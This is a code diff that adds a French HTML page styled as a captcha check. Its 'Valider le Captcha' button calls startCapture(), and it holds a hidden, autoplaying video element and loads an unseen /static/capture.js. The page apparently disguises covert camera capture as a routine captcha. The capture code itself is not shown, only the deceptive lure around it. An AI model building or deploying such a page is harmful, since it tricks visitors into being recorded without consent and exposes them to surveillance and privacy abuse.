@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Captcha - Vérification</title>
+  <style>
+    body {
+      background-color: #0d0d0d;
+      color: #00ffcc;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    h1 {
+      font-size: 1.5em;
+      margin-bottom: 20px;
+    }
+    button {
+      background-color: #00ffcc;
+      color: #0d0d0d;
+      border: none;
+      padding: 10px 20px;
+      font-size: 1em;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Veuillez valider le captcha pour continuer</h1>
+  <button onclick="startCapture()">Valider le Captcha</button>
+  <video id="video" autoplay></video>
+  <script src="/static/capture.js"></script>
+</body>
+</html>
